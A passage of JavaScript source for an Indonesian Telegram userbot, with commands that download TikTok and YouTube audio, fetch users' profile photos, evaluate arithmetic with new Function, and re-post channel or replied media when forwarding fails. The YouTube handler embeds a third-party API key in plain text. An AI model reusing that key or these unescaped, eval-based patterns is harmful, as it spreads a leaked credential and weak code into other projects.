                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            body: `url=${encodeURIComponent(tiktokUrl)}`
        });

        const data = await res.json().catch(() => ({}));
        
        if (!data || data.code !== 0 || !data.data) {
            await client.editMessage(msg.chatId, {
                message: loadingMsg.id,
                text: `<blockquote>❌ <b>ᴀᴜᴅɪᴏ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ ᴀᴛᴀᴜ ʟɪɴᴋ sᴀʟᴀʜ!</b></blockquote>`,
                parseMode: "html"
            });
            return;
        }

        const info = data.data;
        const audioUrl = info.music?.play_url || info.music?.url || info.music || null;
        
        if (!audioUrl) {
            await client.editMessage(msg.chatId, {
                message: loadingMsg.id,
                text: `<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴀᴜᴅɪᴏ ᴅɪ ᴠɪᴅᴇᴏ ᴛɪᴋᴛᴏᴋ ɪɴɪ!</b>

<b>ᴋᴇᴍᴜɴɢᴋɪɴᴀɴ:</b>
1. Video tanpa audio
2. Format tidak didukung
3. Audio di-private</blockquote>`,
                parseMode: "html"
            });
            return;
        }

        try { 
            await client.deleteMessages(msg.chatId, [loadingMsg.id || loadingMsg], { revoke: true }); 
        } catch (e) {}

        const caption = `<blockquote>🎵 <b>ᴀᴜᴅɪᴏ ᴛɪᴋᴛᴏᴋ</b>

• <b>ᴘᴇᴍʙᴜᴀᴛ:</b> @${info.author?.unique_id || "Unknown"}
• <b>ᴍᴜsɪᴋ:</b> ${info.music?.title || "Unknown"}
• <b>ᴀʀᴛɪs:</b> ${info.music?.author || "Unknown"}
• <b>ᴅᴜʀᴀsɪ:</b> ${info.duration || 0} detik

<a href="${tiktokUrl}">🌐 ᴋʟɪᴋ ᴜɴᴛᴜᴋ ʟɪʜᴀᴛ ᴠɪᴅᴇᴏ</a></blockquote>`;

        try {
            await client.sendFile(msg.chatId, {
                file: audioUrl,
                caption: caption,
                parseMode: "html",
                replyTo: msg.id,
                attributes: [{
                    _: 'documentAttributeAudio',
                    duration: info.duration || 0,
                    title: info.music?.title || 'TikTok Audio',
                    performer: info.music?.author || 'Unknown'
                }]
            });
        } catch (sendErr) {
            console.error("[TTMP3] Error sending audio:", sendErr);
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>🎵 <b>Audio TikTok</b>

<b>Link Download:</b> <a href="${audioUrl}">Klik disini</a>

${caption}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }

    } catch (err) {
        console.error("[TTMP3] Error:", err);
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴜɴᴅᴜʜ ᴀᴜᴅɪᴏ!</b>

<b>Error:</b> ${err.message || "Unknown error"}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
    }
    return;
}

        // .getpp
        if (msg.text?.startsWith(`${prefix}getpp`)) {
    try {
        if (!msg.replyTo && !msg.replyToMessageId) {
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ʀᴇᴘʟʏ ᴘᴇsᴀɴ ᴜsᴇʀ!</b></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        let repliedMsg;
        try {
            if (typeof msg.getReplyMessage === 'function') {
                repliedMsg = await msg.getReplyMessage();
            }
            else if (msg.replyToMessageId) {
                const msgs = await client.getMessages(msg.chatId, { ids: msg.replyToMessageId });
                repliedMsg = Array.isArray(msgs) ? msgs[0] : msgs;
            }
        } catch (e) {
            console.log("[GETPP] Error getting replied message:", e.message);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴘᴇsᴀɴ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ!</b></blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        if (!repliedMsg || !repliedMsg.senderId) {
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ <b>ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴇɴᴀʟɪ ᴘᴇɴɢɢᴜɴᴀ!</b></blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        const targetUserId = repliedMsg.senderId;
        let targetUser;
        
        try {
            targetUser = await client.getEntity(targetUserId);
        } catch (e) {
            console.log("[GETPP] Error getting user entity:", e.message);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ɪɴꜰᴏ ᴘᴇɴɢɢᴜɴᴀ!</b></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        const targetUserName = targetUser.firstName || targetUser.username || "User";
        const targetUsername = targetUser.username ? `@${targetUser.username}` : "N/A";

        const loadingMsg = await client.sendMessage(msg.chatId, {
            message: `<blockquote>⏳ <b>ᴍᴇɴɢᴀᴍʙɪʟ ꜰᴏᴛᴏ ᴘʀᴏꜰɪʟ</b>

<b>ᴜsᴇʀ:</b> ${targetUserName}
<b>ᴜsᴇʀɴᴀᴍᴇ:</b> ${targetUsername}

<i>ᴍᴏʜᴏɴ ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ...</i></blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });

        try {
            const photos = await client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: targetUserId,
                    offset: 0,
                    maxId: 0,
                    limit: 1
                })
            );

            if (!photos || photos.count === 0) {
                throw new Error("Tidak ada foto profil");
            }

            const photo = photos.photos[0];
            
            try { 
                await client.deleteMessages(msg.chatId, [loadingMsg.id || loadingMsg], { revoke: true }); 
            } catch (e) {}

            let userFullInfo = {};
            try {
                userFullInfo = await client.invoke(
                    new Api.users.GetFullUser({
                        id: targetUserId
                    })
                );
            } catch (e) {
                console.log("[GETPP] Error getting full user info:", e.message);
            }

            const userBio = userFullInfo.fullUser?.about || "ᴛɪᴅᴀᴋ ᴀᴅᴀ ʙɪᴏ";
            const isPremium = targetUser.premium || targetUser.isPremium ? "✅ ʏᴀ" : "❌ ᴛɪᴅᴀᴋ";

            const caption = `<blockquote>📸 <b>ꜰᴏᴛᴏ ᴘʀᴏꜰɪʟ</b>

👤 <b>ɴᴀᴍᴀ:</b> ${targetUser.firstName || ""} ${targetUser.lastName || ""}
🆔 <b>ᴜsᴇʀɴᴀᴍᴇ:</b> ${targetUsername}
📝 <b>ɪᴅ:</b> <code>${targetUser.id}</code></blockquote>`;

            await client.sendFile(msg.chatId, {
                file: photo,
                parseMode: "html",
                replyTo: msg.id
            });

        } catch (photoError) {
            console.error("[GETPP] Photo error:", photoError);
            
            try {
                const userFull = await client.invoke(
                    new Api.users.GetFullUser({
                        id: targetUserId
                    })
                );

                if (userFull.fullUser?.profile_photo) {
                    try { 
                        await client.deleteMessages(msg.chatId, [loadingMsg.id || loadingMsg], { revoke: true }); 
                    } catch (e) {}

                    const userBio = userFull.fullUser.about || "ᴛɪᴅᴀᴋ ᴀᴅᴀ ʙɪᴏ";
                    const isPremium = targetUser.premium || targetUser.isPremium ? "✅ ʏᴀ" : "❌ ᴛɪᴅᴀᴋ";

                    const caption = `<blockquote>📸 <b>ꜰᴏᴛᴏ ᴘʀᴏꜰɪʟ</b>

👤 <b>ɴᴀᴍᴀ:</b> ${targetUser.firstName || ""} ${targetUser.lastName || ""}
🆔 <b>ᴜsᴇʀɴᴀᴍᴇ:</b> ${targetUsername}
📝 <b>ɪᴅ:</b> <code>${targetUser.id}</code></blockquote>`;

                    await client.sendFile(msg.chatId, {
                        file: userFull.fullUser.profile_photo,
                        parseMode: "html",
                        replyTo: msg.id
                    });
                } else {
                    throw new Error("Tidak ada foto profil");
                }
            } catch (alternativeError) {
                console.error("[GETPP] Alternative error:", alternativeError);
                
                await client.editMessage(msg.chatId, {
                    message: loadingMsg.id,
                    text: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ꜰᴏᴛᴏ ᴘʀᴏꜰɪʟ!</b></blockquote>`,
                    parseMode: "html"
                });
            }
        }

    } catch (error) {
        console.error("[GETPP] Handler Error:", error);
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sɪsᴛᴇᴍ!</b>

${error.message || "Unknown error"}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
    }
    return;
}

       // .calc
       if (msg.text?.startsWith(`${prefix}calc`)) {
    try {
        const args = msg.text.split(' ');
        if (args.length < 2) {
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ ғᴏʀᴍᴀᴛ sᴀʟᴀʜ! ɢᴜɴᴀᴋᴀɴ: <code>${prefix}calc [ekspresi]</code></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        const expression = msg.text.split(' ').slice(1).join(' ');
        
        let result;
        try {
            const validChars = /^[0-9+\-*/().\s,%]+$/;
            if (!validChars.test(expression)) {
                throw new Error("ᴇᴋsᴘʀᴇsɪ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ. ʜᴀɴʏᴀ ᴀɴɢᴋᴀ ᴅᴀɴ ᴏᴘᴇʀᴀᴛᴏʀ + - * / ( ) . , % ʏᴀɴɢ ᴅɪᴘᴇʀʙᴏʟᴇʜᴋᴀɴ");
            }
            
            result = new Function(`return ${expression}`)();
            
            if (typeof result !== 'number' || isNaN(result)) {
                throw new Error("Hasil tidak valid");
            }
            
            let formattedResult;
            if (Number.isInteger(result)) {
                formattedResult = result.toString();
            } else {
                formattedResult = parseFloat(result.toFixed(10)).toString();
                formattedResult = formattedResult.replace(/(\.\d*?[1-9])0+$/, '$1').replace(/\.$/, '');
            }
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>➤ <b>ᴋᴀʟᴋᴜʟᴀᴛᴏʀ</b>\n\n▸ <b>ᴇᴋsᴘʀᴇsɪ:</b> <code>${expression}</code>\n▸ <b>ʜᴀsɪʟ:</b> <code>${formattedResult}</code></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            
        } catch (evalError) {
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ᴇʀʀᴏʀ:</b> ${evalError.message || "ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢʜɪᴛᴜɴɢ ᴇᴋsᴘʀᴇsɪ"}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
        
    } catch (error) {
        console.error("Error in calc command:", error);
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ:</b> ${error.message}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
    }
    return;
}

        // .zodiak
        if (msg.text?.startsWith(`${prefix}zodiak`)) {
    try {
        const args = msg.text.split(' ');
        if (args.length < 2) {
            await client.sendMessage(msg.chatId, {
                message: `<blockquote><b>ɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ: <code>${prefix}zodiak [nama-zodiak]</code>\n\nᴄᴏɴᴛᴏʜ: <code>${prefix}zodiak taurus</code></blockquote></b>`,
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        const zodiacName = args.slice(1).join(' ').toLowerCase();
        const apiUrl = `https://api.siputzx.my.id/api/primbon/zodiak?zodiak=${encodeURIComponent(zodiacName)}`;

        const processingMsg = await client.sendMessage(msg.chatId, {
            message: "<blockquote>🔮 ᴍᴇɴᴄᴀʀɪ ʀᴀᴍᴀʟᴀɴ ᴢᴏᴅɪᴀᴋ...</blockquote>",
            parseMode: "html",
            replyTo: msg.id
        });

        try {
            const response = await fetch(apiUrl);
            const data = await response.json();

            if (data.status) {
                const zodiacData = data.data;
                
                const replyText = `
<blockquote>✨ <b>RAMALAN ZODIAK</b> ✨</blockquote>

<blockquote>⚡️ <b>Zodiak:</b> ${zodiacData.zodiak?.toUpperCase() || 'Tidak diketahui'}</blockquote>
<blockquote>🔢 <b>Nomor Keberuntungan:</b> ${zodiacData.nomor_keberuntungan || 'Tidak diketahui'}</blockquote>
<blockquote>🌺 <b>Aroma Keberuntungan:</b> ${zodiacData.aroma_keberuntungan || 'Tidak diketahui'}</blockquote>
<blockquote>🪐 <b>Planet Keberuntungan:</b> ${zodiacData.planet_yang_mengitari || 'Tidak diketahui'}</blockquote>
<blockquote>🌸 <b>Bunga Keberuntungan:</b> ${zodiacData.bunga_keberuntungan || 'Tidak diketahui'}</blockquote>
<blockquote>🎨 <b>Warna Keberuntungan:</b> ${zodiacData.warna_keberuntungan || 'Tidak diketahui'}</blockquote>
<blockquote>💎 <b>Batu Keberuntungan:</b> ${zodiacData.batu_keberuntungan || 'Tidak diketahui'}</blockquote>
<blockquote>🌪️ <b>Elemen Keberuntungan:</b> ${zodiacData.elemen_keberuntungan || 'Tidak diketahui'}</blockquote>
<blockquote>💑 <b>Pasangan Zodiak:</b> ${zodiacData.pasangan_zodiak || 'Tidak diketahui'}</blockquote>

<blockquote>🌟 <i>Semoga hari Anda penuh keberuntungan!</i></blockquote>
`;

                try {
                    await client.deleteMessages(msg.chatId, [processingMsg.id], { revoke: true });
                } catch (e) {

                }

                await client.sendMessage(msg.chatId, {
                    message: replyText,
                    parseMode: "html",
                    replyTo: msg.id
                });
            } else {
                try {
                    await client.deleteMessages(msg.chatId, [processingMsg.id], { revoke: true });
                } catch (e) {

                }

                await client.sendMessage(msg.chatId, {
                    message: `<blockquote>❌ <b>ᴍᴀᴀғ, ᴢᴏᴅɪᴀᴋ <code>${zodiacName}</code> ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ.</b>\n\nᴘᴀsᴛɪᴋᴀɴ ᴀɴᴅᴀ ᴍᴇɴᴜʟɪs ɴᴀᴍᴀ ᴢᴏᴅɪᴀᴋ ᴅᴇɴɢᴀɴ ʙᴇɴᴀʀ.</blockquote>`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
        } catch (apiError) {
            try {
                await client.deleteMessages(msg.chatId, [processingMsg.id], { revoke: true });
            } catch (e) {

            }

            console.error("API Error:", apiError);
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>⚠️ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀᴛᴀ:</b>\n<code>${apiError.message || 'ɢᴀɢᴀʟ ᴍᴇɴɢʜᴜʙᴜɴɢɪ API'}</code></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
    } catch (error) {
        console.error("Error in zodiak command:", error);
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ:</b> ${error.message}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
    }
    return;
}

        // .proses
        if (msg.text?.startsWith(prefix)) {
    const args = msg.text.slice(prefix.length).trim().split(' ');
    const command = args[0].toLowerCase();
    
    if (command === "proses") {
        try {
            const loadingMsg = await client.sendMessage(msg.chatId, {
                message: "<blockquote>🚀 Memproses...</blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });

            await new Promise(resolve => setTimeout(resolve, 5000));

            if (args.length < 2 || !msg.text.includes(',')) {
                await client.editMessage(msg.chatId, {
                    message: loadingMsg.id,
                    text: "<blockquote>📚 <b>Penggunaan:</b> <code>.proses [name item],[testi]</code>\n\n<b>Contoh:</b> <code>.proses Baju Keren,Barang bagus banget</code></blockquote>",
                    parseMode: "html"
                });
                return;
            }

            const textAfterCommand = args.slice(1).join(' ');
            const parts = textAfterCommand.split(',');
            
            if (parts.length < 2) {
                await client.editMessage(msg.chatId, {
                    message: loadingMsg.id,
                    text: "<blockquote>📚 <b>Penggunaan:</b> <code>.proses [name item],[testi]</code>\n\n<b>Contoh:</b> <code>.proses Baju Keren,Barang bagus banget</code></blockquote>",
                    parseMode: "html"
                });
                return;
            }

            const name_item = parts[0].trim();
            const testi = parts.slice(1).join(',').trim();

            if (!name_item || !testi) {
                await client.editMessage(msg.chatId, {
                    message: loadingMsg.id,
                    text: "<blockquote>❌ <b>Error:</b> Nama item dan testimoni tidak boleh kosong!\n\n<b>Contoh:</b> <code>.proses Baju Keren,Barang bagus banget</code></blockquote>",
                    parseMode: "html"
                });
                return;
            }

            const response = `
<blockquote>✅️ <b>PESANAN DIPROSES</b></blockquote>

<blockquote>📦 <b>Barang:</b> ${name_item}
👉 <b>Testimoni:</b> ${testi}</blockquote>

<b>Kami Sedang Mengerjakan Pesanan Anda, Mohon Tidak Spam Owner supaya Pesanan Lebih Cepat Diproses, Terima Kasih</b>

<blockquote><b>Userbot By @Aksesadd_bot</b></blockquote>
`;

            await client.editMessage(msg.chatId, {
                message: loadingMsg.id,
                text: response,
                parseMode: "html"
            });

        } catch (error) {
            console.error("Error in proses command:", error);
            
            try {
                if (loadingMsg) {
                    await client.deleteMessages(msg.chatId, [loadingMsg.id], { revoke: true });
                }
            } catch (e) {

            }
            
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>Error:</b> ${error.message}</blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
        }
        return;
    }
    
    else if (command === "p") {
        try {
            await client.editMessage(msg.chatId, {
                message: msg.id,
                text: "Assalamu'alaikum"
            });
        } catch (e) {
            await client.sendMessage(msg.chatId, {
                message: "Assalamu'alaikum",
                replyTo: msg.id
            });
        }
        return;
    }
    
    else if (command === "pe") {
        try {
            await client.editMessage(msg.chatId, {
                message: msg.id,
                text: "Assalamualaikum Warahmatullahi Wabarakatuh"
            });
        } catch (e) {
            await client.sendMessage(msg.chatId, {
                message: "Assalamualaikum Warahmatullahi Wabarakatuh",
                replyTo: msg.id
            });
        }
        return;
    }
    
}

          // .copy
         if (msg.text?.startsWith(`${prefix}copy`)) {
    try {
        const args = msg.text.split(' ');
        
        if (args.length < 2) {
            await client.sendMessage(msg.chatId, {
                message: "❌ Format: <code>.copy [link_telegram]</code>\n\nContoh: <code>.copy https://t.me/channel/123</code>",
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }
        
        const link = args[1];
        
        if (!link.startsWith("https://t.me/")) {
            await client.sendMessage(msg.chatId, {
                message: "❌ Link harus dari Telegram (https://t.me/)",
                replyTo: msg.id
            });
            return;
        }
        
        const processMsg = await client.sendMessage(msg.chatId, {
            message: "⏳ Memproses link...",
            replyTo: msg.id
        });
        
        try {
            const url = new URL(link);
            const pathParts = url.pathname.split('/').filter(p => p);
            
            if (pathParts.length < 2) {
                throw new Error("Format link tidak valid");
            }
            
            let chatName, msgId;
            
            if (link.includes("/c/")) {
                const cIndex = pathParts.indexOf("c");
                chatName = "-100" + pathParts[cIndex + 1];
                msgId = parseInt(pathParts[cIndex + 2]);
            } else {
                chatName = pathParts[0];
                msgId = parseInt(pathParts[1]);
            }
            
            if (!msgId || isNaN(msgId)) {
                throw new Error("ID pesan tidak valid");
            }
            
            console.log(`Mencoba mengambil: chat=${chatName}, msgId=${msgId}`);
            
            const messages = await client.getMessages(chatName, { ids: msgId });
            
            if (!messages || messages.length === 0) {
                throw new Error("Pesan tidak ditemukan");
            }
            
            const messageObj = messages[0];
            const caption = messageObj.message || "";
            
            await client.deleteMessages(msg.chatId, [processMsg.id], { revoke: true });
            
            try {
                await client.forwardMessages(msg.chatId, {
                    messages: msgId,
                    fromPeer: chatName,
                });
                
                if (caption.trim()) {
                    await client.sendMessage(msg.chatId, {
                        message: `${caption}`,
                        parseMode: "html",
                        replyTo: msg.id
                    });
                }
                
                return;
            } catch (forwardError) {
                console.log("Forward gagal, coba download:", forwardError);

            }
            
            const fs = require('fs');
            const path = require('path');
            const tempDir = './temp_copy';
            
            if (!fs.existsSync(tempDir)) {
                fs.mkdirSync(tempDir, { recursive: true });
            }
            
            const tempFile = path.join(tempDir, `copy_${Date.now()}`);
            
            try {
                await client.downloadMedia(messageObj, {
                    outputFile: tempFile
                });
                
                const stats = fs.statSync(tempFile);
                if (stats.size === 0) {
                    throw new Error("File kosong");
                }
                
                if (messageObj.photo) {
                    await client.sendPhoto(msg.chatId, {
                        source: tempFile,
                        caption: caption,
                        parseMode: "html",
                        replyTo: msg.id
                    });
                    
                } else if (messageObj.video) {
                    await client.sendVideo(msg.chatId, {
                        source: tempFile,
                        caption: caption,
                        parseMode: "html",
                        supportsStreaming: true,
                        replyTo: msg.id
                    });
                    
                } else if (messageObj.audio) {
                    await client.sendAudio(msg.chatId, {
                        source: tempFile,
                        caption: caption,
                        parseMode: "html",
                        replyTo: msg.id
                    });
                    
                } else if (messageObj.document) {
                    await client.sendDocument(msg.chatId, {
                        source: tempFile,
                        caption: caption,
                        parseMode: "html",
                        replyTo: msg.id
                    });
                    
                } else if (messageObj.sticker) {
                    await client.sendSticker(msg.chatId, {
                        source: tempFile,
                        replyTo: msg.id
                    });
                    
                } else if (messageObj.voice) {
                    await client.sendVoice(msg.chatId, {
                        source: tempFile,
                        caption: caption,
                        parseMode: "html",
                        replyTo: msg.id
                    });
                    
                } else {
                    await client.sendDocument(msg.chatId, {
                        source: tempFile,
                        caption: caption || "File dari link Telegram",
                        parseMode: "html",
                        replyTo: msg.id
                    });
                }
                
                fs.unlinkSync(tempFile);
                
            } catch (downloadError) {
                console.error("Download/send error:", downloadError);
                
                try {
                    if (fs.existsSync(tempFile)) {
                        fs.unlinkSync(tempFile);
                    }
                } catch (e) {

                }
                
                await client.sendMessage(msg.chatId, {
                    message: `🔗 <b>Link:</b> ${link}\n\n${caption ? `<b>Caption:</b>\n${caption}` : ''}`,
                    parseMode: "html",
                    replyTo: msg.id
                });
            }
            
        } catch (error) {
            try {
                await client.deleteMessages(msg.chatId, [processMsg.id], { revoke: true });
            } catch (e) {

            }
            
            console.error("Error in copy:", error);
            await client.sendMessage(msg.chatId, {
                message: `❌ Gagal: ${error.message || "Link tidak valid"}`,
                replyTo: msg.id
            });
        }
        
    } catch (error) {
        console.error("Error in copy command:", error);
        await client.sendMessage(msg.chatId, {
            message: `❌ Error: ${error.message}`,
            replyTo: msg.id
        });
    }
    return;
}

           // .colong
          if (msg.text?.startsWith(`${prefix}colong`)) {
    try {
        if (!msg.replyTo && !msg.replyToMessageId) {
            await client.sendMessage(msg.chatId, {
                message: `<blockquote>❌ <b>ʀᴇᴘʟʏ ᴘᴇsᴀɴ ᴍᴇᴅɪᴀ!</b></blockquote>`,
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        let repliedMsg;
        try {
            if (typeof msg.getReplyMessage === 'function') {
                repliedMsg = await msg.getReplyMessage();
            }
            else if (msg.replyToMessageId) {
                const msgs = await client.getMessages(msg.chatId, { ids: msg.replyToMessageId });
                repliedMsg = Array.isArray(msgs) ? msgs[0] : msgs;
            }
        } catch (e) {
            console.log("[COLONG] Error getting replied message:", e.message);
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴘᴇsᴀɴ ʏᴀɴɢ ᴅɪʀᴇᴘʟʏ!</b></blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        if (!repliedMsg || !repliedMsg.media) {
            await client.sendMessage(msg.chatId, {
                message: "<blockquote>❌ <b>ᴘᴇsᴀɴ ᴛɪᴅᴀᴋ ᴍᴇɴɢᴀɴᴅᴜɴɢ ᴍᴇᴅɪᴀ!</b></blockquote>",
                parseMode: "html",
                replyTo: msg.id
            });
            return;
        }

        const loadingMsg = await client.sendMessage(msg.chatId, {
            message: `<blockquote>⏳ <b>ᴍᴇɴɢᴀᴍʙɪʟ ᴍᴇᴅɪᴀ</b>

<i>ᴍᴏʜᴏɴ ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ...</i></blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });

        try {
            const fs = require('fs');
            const path = require('path');
            const tempDir = './temp_colong';
            
            if (!fs.existsSync(tempDir)) {
                fs.mkdirSync(tempDir, { recursive: true });
            }

            let extension = '.jpg';
            if (repliedMsg.photo) {
                extension = '.jpg';
            } else if (repliedMsg.video) {
                extension = '.mp4';
            } else if (repliedMsg.audio) {
                extension = '.mp3';
            } else if (repliedMsg.voice) {
                extension = '.ogg';
            } else if (repliedMsg.document) {
                if (repliedMsg.document.attributes) {
                    const fileNameAttr = repliedMsg.document.attributes.find(attr => 
                        attr.className === 'DocumentAttributeFilename'
                    );
                    if (fileNameAttr && fileNameAttr.fileName) {
                        const ext = path.extname(fileNameAttr.fileName);
                        if (ext) extension = ext;
                        else extension = '.bin';
                    }
                }
            }

            const timestamp = Date.now();
            const randomStr = Math.random().toString(36).substring(7);
            const tempFileName = `colong_${timestamp}_${randomStr}${extension}`;
            const tempFilePath = path.join(tempDir, tempFileName);

            await client.downloadMedia(repliedMsg, {
                outputFile: tempFilePath
            });

            if (!fs.existsSync(tempFilePath) || fs.statSync(tempFilePath).size === 0) {
                throw new Error("Gagal mendownload media");
            }

            try { 
                await client.deleteMessages(msg.chatId, [loadingMsg.id || loadingMsg], { revoke: true }); 
            } catch (e) {}

            const caption = repliedMsg.message ? 
                `<blockquote>${repliedMsg.message}</blockquote>` : 
                `<blockquote>✅ <b>ᴍᴇᴅɪᴀ ʙᴇʀʜᴀsɪʟ ᴅɪᴄᴏʟᴏɴɢ</b></blockquote>`;

            await client.sendFile(msg.chatId, {
                file: tempFilePath,
                caption: caption,
                parseMode: "html",
                replyTo: msg.id
            });

            setTimeout(() => {
                try {
                    if (fs.existsSync(tempFilePath)) {
                        fs.unlinkSync(tempFilePath);
                        console.log(`[COLONG] File temporary dihapus: ${tempFilePath}`);
                        
                        const files = fs.readdirSync(tempDir);
                        if (files.length === 0) {
                            fs.rmdirSync(tempDir);
                        }
                    }
                } catch (cleanupError) {
                    console.warn("[COLONG] Gagal menghapus file temporary:", cleanupError);
                }
            }, 3000);

        } catch (error) {
            console.error("[COLONG] Media error:", error);
            
            await client.editMessage(msg.chatId, {
                message: loadingMsg.id,
                text: `<blockquote>❌ <b>ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴍᴇᴅɪᴀ!</b>

${error.message || "Media mungkin sudah dihapus"}</blockquote>`,
                parseMode: "html"
            });
        }

    } catch (error) {
        console.error("[COLONG] Handler Error:", error);
        await client.sendMessage(msg.chatId, {
            message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sɪsᴛᴇᴍ!</b>

${error.message || "Unknown error"}</blockquote>`,
            parseMode: "html",
            replyTo: msg.id
        });
    }
    return;
}

// .ytmp3 (menggunakan API BOTCAHX)
if (msg.text?.startsWith(`${prefix}mp3yt`)) {
  (async () => {
    const chatId = msg.chatId;
    const text = msg.text?.split(" ").slice(1).join(" ");
    
    if (!text) {
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ <b>ᴍᴀsᴜᴋᴋᴀɴ ʟɪɴᴋ ʏᴏᴜᴛᴜʙᴇ!</b></blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });
      return;
    }

    // Validasi link YouTube
    if (!text.includes("youtube.com/watch") && !text.includes("youtu.be/")) {
      await client.sendMessage(msg.chatId, {
        message: `<blockquote>❌ <b>ʟɪɴᴋ ʏᴏᴜᴛᴜʙᴇ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ!</b>\n\nᴄᴏɴᴛᴏʜ: ${prefix}ytmp3 https://youtube.com/watch?v=xxxx</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });
      return;
    }

    try {
      const loadingMsg = await client.sendMessage(msg.chatId, {
        message: `<blockquote>🔍 <i>ᴍᴇᴍᴘʀᴏsᴇs ᴀᴜᴅɪᴏ...</i>\n\n📥 ${text}</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

      const fetch = require('node-fetch');
      
      // Panggil API BOTCAHX
      const apiUrl = `https://api.botcahx.eu.org/api/dowloader/yt?url=${encodeURIComponent(text)}&apikey=3ffv9qXp`;
      const response = await fetch(apiUrl);
      const data = await response.json();

      if (!data.status || !data.result.mp3) {
        throw new Error('Gagal mendapatkan link audio');
      }

      await client.deleteMessages(msg.chatId, [loadingMsg.id], { revoke: true }).catch(() => {});

      const result = data.result;
      
      // Kirim preview dulu dengan thumbnail
      try {
        await client.sendFile(msg.chatId, {
          file: result.thumb,
          caption: `<blockquote>
🎬 <b>${result.title}</b>
⏱️ <b>ᴅᴜʀᴀsɪ:</b> ${result.duration}
🔗 <b>sᴏᴜʀᴄᴇ:</b> <a href="${result.source}">YouTube</a>

⏳ <i>sᴇᴅᴀɴɢ ᴍᴇɴɢɪʀɪᴍ ᴀᴜᴅɪᴏ...</i>
© ʙʏ ᴅᴏʏᴀɴɢ 👑
</blockquote>`,
          parseMode: "html",
          replyTo: msg.id,
        });
      } catch (err) {
        // Kalau gagal kirim thumbnail, lanjut tanpa thumbnail
        console.error("Gagal kirim thumbnail:", err.message);
      }

      // Kirim file audio
      await client.sendFile(msg.chatId, {
        file: result.mp3,
        caption: `<blockquote>
🎵 <b>${result.title}</b>
⏱️ ${result.duration}
✅ ʙᴇʀʜᴀsɪʟ ᴅɪᴅᴏᴡɴʟᴏᴀᴅ!
</blockquote>`,
        parseMode: "html",
        replyTo: msg.id,
      });

    } catch (err) {
